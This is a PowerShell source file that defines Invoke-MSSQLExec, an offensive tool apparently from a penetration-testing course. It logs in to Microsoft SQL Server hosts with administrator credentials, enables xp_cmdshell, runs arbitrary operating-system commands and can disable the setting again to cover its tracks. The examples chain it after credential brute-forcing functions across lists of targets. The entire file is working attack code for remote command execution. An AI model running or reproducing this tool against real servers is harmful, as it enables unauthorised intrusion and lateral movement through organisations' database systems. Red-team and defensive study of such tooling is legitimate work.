Function Invoke-MSSQLExec {

    <#
.SYNOPSIS
    Utilizes xp_cmdshell on Microsoft SQL Server to execute command in OS
.DESCRIPTION
    Microsoft SQL Server has xp_cmdshell procedure which executes any command in 
    operating system. This function tries to laverage that functionality. 
.PARAMETER Targets
    Array with targets (each object in array should have Host, Username and Pasword properties)
.PARAMETER Target
    Target to exec. Default port for MSSQL is 1433, if you have a host on another one 
    enter it using comma (not colon), for example: 172.16.100.10,1432
.PARAMETER User
    Username (should be sa or other with admin privileges)
.PARAMETER Password
    Password for superadmin
.INPUTS
    Hosts array
.OUTPUTS
    Array of objects with proporties: Host, User, Password, Command, Output
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLExec -host "172.16.0.100" -User  sa -p 'P@ssw0rd' -Command "whoami" -verbose
.EXAMPLE
    $targets =
        @{Host="172.16.0.101";User="sa";Password="Zima2019!"},
        @{Host="172.16.0.102";User="sa";Password="P@ssw0rd"}

        Invoke-MSSQLExec -Targets $targets -Command "whoami" -Verbose|format-list
.EXAMPLE
    Invoke-MSSQLSPNSearch | Invoke-MSSQLBrute | Invoke-MSSQLExec -Command whoami
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true, ParameterSetName = 'object')]
        [Object[]]$Targets,

        [Parameter(Mandatory = $true, ParameterSetName = 'host')]
        [Alias("Server", "Host")]
        [String]$Target,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'host')]
        [String]$User = "sa",
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'host')]
        [String]$Password = (""),
        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [String]$Command = (""),
        [Parameter()]
        [ValidateSet('No','IfNeeded')]
        [String]$EnableXpCmdShell = ("IfNeeded"),
        [Parameter()]
        [ValidateSet('Yes','IfModified', 'No')]
        [String]$DisableXpCmdShell = ("IfModified")

    )

    Begin {
        $Result = @()
        $XPCmdShellModified = $false
        $enable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
'@
        $disable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 0;  
RECONFIGURE;  
'@

        $check_xp_cmdshell_query = @'
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';
'@

        function query($conn, $sql) {
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $sql
            $result = $cmd.ExecuteReader()
            $table = new-object "System.Data.DataTable"
            $table.Load($result)
            return $table
        }
        function xp_cmdshell_enable($conn) {
            query $conn $enable_xp_cmdshell_query
        }
        function xp_cmdshell_disable($conn) {
            query $conn $disable_xp_cmdshell_query
        }
        function xp_cmdshell_check($conn) {
            $t = query $conn $check_xp_cmdshell_query
            return $t.IsConfigured
        }
    }

    Process {
        if ($PSCmdlet.ParameterSetName -eq "host") {
            $Targets = @{Host=$Target;User=$User;Password=$Password}
        }

        ForEach ($obj in $Targets) {
            $target = $obj.Host -Replace ':',','
            $user = $obj.User
            $password = $obj.Password
            Write-Verbose "[*] Trying host $target"
            $Connection = New-Object System.Data.SQLClient.SQLConnection
            $Connection.ConnectionString = "Data Source=$target;Persist Security Info=True;User ID=$user;Password=$password"
            try {
                $Connection.Open()
                Write-Verbose "[*] Connected to $target"
                try {
                    if ($EnableXpCmdShell -eq "IfNeeded") {
                        Write-Verbose "[*] Checking whether xp_cmdshell is enabled"
                        $enabled = xp_cmdshell_check $Connection
                        Write-Verbose "[*] xp_cmdshell enabled: $enabled"
                        if ($enabled -eq 0) {
                            Write-Verbose "[*] Enabling xp_cmdshell"
                            xp_cmdshell_enable $Connection
                            $XPCmdShellModified = $true
                        }
                    }

                    Write-Verbose "[*] Trying to execute xp_cmdshell '$Command'"
                    try {
                        $output = query $Connection "exec xp_cmdshell '$Command'"

                        $o = New-Object -TypeName psobject 
                        $o | Add-Member -MemberType NoteProperty -Name Host -Value $target
                        $o | Add-Member -MemberType NoteProperty -Name User -Value $user
                        $o | Add-Member -MemberType NoteProperty -Name Password -Value $password
                        $o | Add-Member -MemberType NoteProperty -Name Command -Value $Command
                        $o | Add-Member -MemberType NoteProperty -Name Output -Value ($output.output -join "`n")
                        $Result += $o
                    } catch [Exception] {
                        Write-Error "Whoops"
                        Write-Host $_.Exception.Message
                    }

                    if ($DisableXpCmdShell -eq "Yes" -or ($XPCmdShellModified -eq $true -and $DisableXpCmdShell -eq "IfModified")) {
                        Write-Verbose "[*] Disabling xp_cmdshell"
                        xp_cmdshell_disable $Connection
                    }
                }
                catch [Exception] {
                    Write-Error "Whoops"
                    Write-Host $_.Exception.Message
                }
            }
            catch [Exception] {
                Write-Verbose "[*] Can't connect to $_host ($($User):$($Password))"
            }
        }
    }

    End {
        $Result
    }

}


